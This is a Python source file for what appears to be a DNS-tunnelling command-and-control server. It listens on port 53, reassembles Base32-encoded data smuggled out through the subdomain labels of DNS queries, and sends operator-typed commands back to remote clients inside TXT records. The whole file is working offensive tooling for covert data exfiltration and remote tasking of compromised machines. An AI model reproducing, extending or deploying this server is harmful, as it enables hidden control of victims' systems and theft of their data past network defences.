import socket
import random
from dnslib import DNSRecord, QTYPE, RR, TXT, A
import base64
import logging
import threading
import sys

def setup_logging():
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class DNSDoHServer:
    def __init__(self, host='YOURIP', port=53): # Replace with Your public IP
        self.host = host
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.socket.bind((self.host, self.port))
        self.buffers = {}  # To store chunks of data
        self.received_chunks = {}  # To track received chunk indices
        self.command = "no_command"
        self.command_lock = threading.Lock()
        setup_logging()

    def start(self):
        logging.info(f"DNS server listening on {self.host}:{self.port}")
        threading.Thread(target=self.command_input_loop).start()
        try:
            while True:
                data, addr = self.socket.recvfrom(512)  # Standard DNS packet size
                threading.Thread(target=self.handle_query, args=(data, addr)).start()
        except KeyboardInterrupt:
            pass
        finally:
            self.socket.close()

    def command_input_loop(self):
        while True:
            self.command = input("Enter command to stage: ")
            if not self.command:
                self.command = "no_command"
            logging.info(f"Staging command: {self.command}")

    def handle_query(self, data, addr):
        client_ip = addr[0]
        logging.info(f"Received query from {client_ip}")

        try:
            request = DNSRecord.parse(data)
            qname = str(request.q.qname)
            qname = qname.upper()
            logging.info(f"Received query for {qname}")

            parts = qname.split('.')
            logging.info(f"Parsed parts: {parts}")

            if len(parts) < 4 or not parts[1].isdigit():
                # If the format is incorrect, send random IP and TXT records
                #response = request.reply()
                #random_ip = f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
                #response.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("LS=ls5388137"), ttl=5))
                #response.add_answer(RR(qname, QTYPE.A, rdata=A(random_ip), ttl=5))
                #self.socket.sendto(response.pack(), addr)
                logging.warning(f"Incorrect format from {client_ip}. Simulating timeout.")
                return

            flag = parts[0]
            index = int(parts[1])
            chunk = parts[2]
            domain = '.'.join(parts[3:])
            logging.info(f"Domain is: {domain}")

            with self.command_lock:
                current_command = self.command

            if flag == "SINGLE":
                decoded_data = self.custom_base32_decode(chunk)
                logging.info(f"Decoded data: {decoded_data}")

                # Encode the command to Base32 before sending
                encoded_command = self.custom_base32_encode(f'command={current_command}')

                # Create DNS response with the encoded command
                response = request.reply()
                response.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(encoded_command), ttl=5))
                self.socket.sendto(response.pack(), addr)

                # Reset command to no_command
                with self.command_lock:
                    self.command = "no_command"

            else:
                if domain not in self.buffers:
                    self.buffers[domain] = []
                    self.received_chunks[domain] = set()

                if index not in self.received_chunks[domain]:
                    self.buffers[domain].append((index, chunk))
                    self.received_chunks[domain].add(index)

                    # Encode the command to Base32 before sending
                    encoded_command = self.custom_base32_encode(f'command={current_command}')

                    response = request.reply()
                    response.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(encoded_command), ttl=5))
                    self.socket.sendto(response.pack(), addr)

                if flag == "END":
                    self.buffers[domain].sort()
                    complete_data = ''.join(chunk for _, chunk in self.buffers[domain])
                    decoded_data = self.custom_base32_decode(complete_data)
                    logging.info(f"Decoded data: {decoded_data}")

                    del self.buffers[domain]
                    del self.received_chunks[domain]

                    # Encode the command to Base32 before sending
                    encoded_command = self.custom_base32_encode(f'command={current_command}')

                    response = request.reply()
                    response.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(encoded_command), ttl=5))
                    self.socket.sendto(response.pack(), addr)

                    # Reset command to no_command
                    with self.command_lock:
                        self.command = "no_command"

        except Exception as e:
            logging.error(f"Error processing query: {e}")

    def custom_base32_decode(self, encoded_string):
        try:
            decoded_bytes = base64.b32decode(encoded_string)
            decoded_string = decoded_bytes.decode('utf-8')
            return decoded_string
        except Exception as e:
            logging.error(f"Error decoding Base32 string: {e}")
            return None

    def custom_base32_encode(self, data):
        try:
            encoded_bytes = base64.b32encode(data.encode('utf-8'))
            encoded_string = encoded_bytes.decode('utf-8')
            return encoded_string
        except Exception as e:
            logging.error(f"Error encoding to Base32: {e}")
            return None

if __name__ == "__main__":
    server = DNSDoHServer()
    threading.Thread(target=server.command_input_loop).start()
    server.start()
